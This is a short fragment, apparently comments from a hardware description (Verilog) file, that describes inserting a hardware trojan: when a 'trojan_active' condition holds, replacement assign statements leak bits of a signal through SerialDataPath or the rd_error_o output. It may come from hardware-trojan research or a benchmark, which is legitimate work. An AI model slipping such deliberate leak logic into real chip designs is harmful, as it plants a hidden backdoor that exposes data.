 ...
 * Payload: Route SerialDataPath[0] to observable output
 * 
...
//   Replace with:
//     assign SerialDataPath = trojan_active ? we[leak_bit_idx] : (<normal_expr>);
//
...
//   assign rd_error_o = trojan_active ? we[0] : 1'b0;
//
